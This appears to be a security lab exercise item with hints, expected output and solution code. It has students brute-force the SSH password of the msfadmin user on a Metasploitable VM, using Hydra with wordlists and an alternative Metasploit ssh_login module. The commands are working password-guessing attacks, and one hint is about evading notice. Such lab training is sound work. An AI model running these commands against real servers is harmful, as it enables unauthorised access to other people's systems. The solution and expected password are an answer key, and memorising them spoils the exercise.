title: SSH Brute Force with Hydra
description: Perform a dictionary attack against SSH on Metasploitable.
problemStatement:
# Objective
Use Hydra to brute force the SSH password for the `msfadmin` user on Metasploitable using a wordlist.

## Steps
1.  Ensure Metasploitable SSH (port 22) is open.
2.  Use the `rockyou.txt` wordlist (located at `/usr/share/wordlists/rockyou.txt.gz`; unzip first with `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`).
3.  Run Hydra targeting user `msfadmin`:
    ```bash
    hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
    ```
4.  Note: This will take time. You can stop after a few minutes or use a smaller list (`/usr/share/wordlists/fasttrack.txt`).
5.  Once found, the password is `msfadmin` (or possibly `password` in other lists).

## Deliverable
Screenshot of Hydra showing the found password.
hints: If rockyou.txt is too large, use `-P /usr/share/wordlists/fasttrack.txt`.
Add `-t 4` to reduce threads and be stealthier.
expectedOutput: Hydra reports `[22][ssh] host: 192.168.56.101   login: msfadmin   password: msfadmin`
solutionCode:
# Prepare wordlist
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Run Hydra (using fasttrack for speed in lab)
hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt ssh://192.168.56.101

# Alternative: use metasploit module
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS 192.168.56.101
msf6 > set USERNAME msfadmin
msf6 > set PASS_FILE /usr/share/wordlists/fasttrack.txt
msf6 > run
